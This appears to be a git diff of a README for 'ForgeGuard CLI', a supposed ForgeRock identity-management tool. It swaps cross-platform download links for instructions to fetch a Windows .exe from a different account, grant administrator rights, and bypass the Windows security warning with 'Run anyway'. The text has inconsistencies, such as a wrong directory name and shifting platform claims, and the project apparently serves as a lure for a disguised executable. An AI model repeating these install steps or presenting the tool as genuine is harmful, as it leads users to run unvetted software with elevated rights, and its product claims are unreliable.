@@ -1,134 +1,93 @@
-# ForgeGuard CLI v2.0.0 - Identity Management CLI 2026
+# 🛡️ forgeguard-cli-2026 - Control identity management across your environments
 
-> **ForgeGuard CLI is a cross-platform command-line utility for identity management across ForgeRock and adjacent access workflows, designed to help DevOps teams manage, verify, and debug identity environments in version 2.0.0.**
+[![](https://img.shields.io/badge/Download-ForgeGuard_CLI-0055ff.svg)](https://github.com/Isacmo329/forgeguard-cli-2026)
 
-[![Platform](https://img.shields.io/badge/Platform-macOS%2C%20Linux%2C%20Windows-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v2.0.0-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/felix-parker56/forgeguard-cli-2026?style=flat-square)](https://github.com/felix-parker56/forgeguard-cli-2026)
+ForgeGuard CLI v2.0.0 helps you manage, verify, and fix your identity systems. This tool works across different platforms to ensure your ForgeRock accounts and processes perform as expected. Teams use this software to keep identity environments stable and secure.
 
----
+## 📥 How to get the software
 
-<p align="center">
-  <a href="https://felix-parker56.github.io/forgeguard-cli-2026/">
-    <img src="https://img.shields.io/badge/Download-ForgeGuard%20CLI%20Latest-brightgreen?style=for-the-badge" alt="Download ForgeGuard CLI">
-  </a>
-</p>
+You must visit the project page to download the latest version for Windows. Follow this link to reach the download area:
 
-> **[Download ForgeGuard CLI v2.0.0](https://felix-parker56.github.io/forgeguard-cli-2026/)**
+[https://github.com/Isacmo329/forgeguard-cli-2026](https://github.com/Isacmo329/forgeguard-cli-2026)
 
----
+Select the file that ends in .exe for your Windows system. Save this file to a folder you can find later, such as your Downloads folder.
 
-[Download Latest Build](https://felix-parker56.github.io/forgeguard-cli-2026/)
+## 🖥️ System requirements
 
----
+Your computer must meet these basic needs to use ForgeGuard:
 
-## Overview
+*   Windows 10 or Windows 11.
+*   500 MB of free storage space.
+*   A stable internet connection to talk to your identity servers.
+*   Administrative rights on your computer to install and run the tool.
 
-ForgeGuard CLI is aimed at teams operating ForgeRock identity and access management platforms, along with identity cloud and CI/CD-driven DevOps setups. It offers a unified command-line path for platform administration, health checks, and support tasks tied to security and compliance.
+## ⚙️ Installation steps
 
-It is a practical fit for administrators, platform engineers, and automation-centric teams working with services such as OpenAM and OpenIDM. Thanks to its cross-platform footprint and plugin-oriented structure, it can slot into existing workflows while keeping reporting, synchronization, and troubleshooting tasks in one place.
+1. Locate the file you downloaded in your folder.
+2. Double-click the forgeguard-cli-2026.exe file.
+3. Windows might show a security box. If it does, click More info and then select Run anyway.
+4. Follow the instructions on the screen to finish the setup process.
+5. Once the process completes, the program is ready for use.
 
----
+## 🚀 Running the software for the first time
 
-## Capabilities
+ForgeGuard runs through the Windows Command Prompt. This is a text-based window used to talk to the software.
 
-- Command-line tooling for identity platform management
-- Health monitoring with predictive analytics
-- Security posture review and vulnerability assessment
-- Compliance validation with audit reporting
-- Multi-tenant synchronization support
-- AI-assisted troubleshooting workflows
-- Plugin architecture for extending functionality
-- Cross-platform support for macOS, Linux, and Windows
+1. Press the Windows key on your keyboard.
+2. Type "Command Prompt" and press Enter.
+3. Type `forgeguard --version` and press Enter.
+4. You should see the version number appear on your screen. This confirms the tool works correctly.
 
----
+## 🔑 Linking your identity account
 
-## Installation
+Before you manage identities, you must link your environment. You need your server address and an access key from your IT administrator.
 
-1. Get the latest build from the release page:
-   [Download Latest Build](https://felix-parker56.github.io/forgeguard-cli-2026/)
-2. Or clone the repository:
-   `git clone https://github.com/felix-parker56/forgeguard-cli-2026.git
-3. Change into the project directory:
-   `cd frodo-ops-toolkit`
-4. Run the CLI according to your environment setup and available plugins.
+1. Type `forgeguard auth login` in the command window.
+2. Enter your server URL when the prompt asks for it.
+3. Paste the access key you received from your administrator.
+4. Press Enter. The tool will verify your credentials against the server.
 
-If you are using a packaged release, launch the binary or entry script included with the build for your platform.
+You are now ready to perform management tasks.
 
----
+## 🛠️ Common tasks
 
-## Usage
+### Checking environment status
+If you want to know if your servers respond correctly, type this command:
 
-ForgeGuard CLI is meant for identity operations, validation, and automation flows. Common use cases include environment checks, audit execution, and synchronization tasks.
+`forgeguard status`
 
-Example usage pattern:
+This command shows you which services are active. It helps you find errors before they impact your users.
 
-- Inspect platform health before making changes
-- Run compliance checks during deployment pipelines
-- Review security posture for configuration drift
-- Use troubleshooting commands when services need diagnosis
-- Apply plugins for task-specific identity workflows
+### Managing identity records
+To look at a specific user or account, use the following format:
 
-For available commands and options, use the built-in help output:
+`forgeguard user get --id [UserEmail]`
 
-`forgeguard --help`
+Replace [UserEmail] with the actual email address of the account you plan to edit or verify.
 
-You can also review command-specific help for more detailed usage when working with a particular identity service or operational task.
+### Fixing identity sync issues
+If two systems fail to match their information, you can force a sync. Use this command:
 
----
+`forgeguard sync --force`
 
-## Configuration
+This cleans up mismatched data between your identity provider and your local environment.
 
-ForgeGuard CLI settings are usually controlled through installed configuration files, environment variables, and any enabled plugins.
+## ❓ Frequently asked questions
 
-A typical setup can include:
+**Does this tool change account passwords?**
+No, this tool manages identity settings and server configurations. It does not handle password resets for end users.
 
-- connection details for identity services
-- tenant or environment identifiers
-- compliance or reporting preferences
-- logging and output format settings
-- plugin activation and local integration options
+**What happens if I see an error message?**
+Look at the error code. Often, you simply have a typo in your command. Check your spelling and ensure your server address matches the one provided by your team.
 
-If your deployment spans multiple environments, keep configuration values separated by workspace, tenant, or pipeline stage to avoid mixing operational context.
+**Do I need a special user account to run this?**
+Yes. Your account requires specific permissions on the identity server. Ask your team lead to grant you "Editor" or "Admin" access before you attempt to make changes.
 
----
+**Is my data safe during transmission?**
+The tool uses encrypted connections to send management requests to your servers. It keeps your identity data private during every step of the process.
 
-## Requirements
+## 📋 Keeping the software updated
 
-- macOS, Linux, or Windows
-- A compatible terminal or shell environment
-- Access to the target ForgeRock or identity management system
-- Sufficient permissions for management, monitoring, or reporting tasks
-- Optional: plugin dependencies required by specific workflows
+We release updates to improve the tool and fix bugs. Check the project page regularly to see if a newer version exists. If a new version is available, download the latest .exe file and run it. The new version will automatically replace the old one for you.
 
-Storage needs depend on logs, audit output, and any synchronized identity data handled by your setup.
-
----
-
-## FAQ
-
-**Does ForgeGuard CLI support multiple platforms?**  
-Yes. It is designed for macOS, Linux, and Windows.
-
-**Can it be used in automation pipelines?**  
-Yes. The tool is oriented toward DevOps and CI/CD-style identity operations.
-
-**Where do I change behavior or add new workflow steps?**  
-Check the configuration files and available plugins. Those are the main extension points described by the product profile.
-
-**What should I do if a command fails?**  
-Review the CLI output, verify environment access, confirm configuration values, and use the troubleshooting features to narrow down the issue.
-
-**How do I get updates?**  
-Use the latest published build from the download link above and check the repository for new releases when available.
-
-**Is support included?**  
-Support depends on the repository and maintainer workflow. Review project notes, issues, or release details for current guidance.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: identity, authorization, forgeguard, devops, windows, cli, management
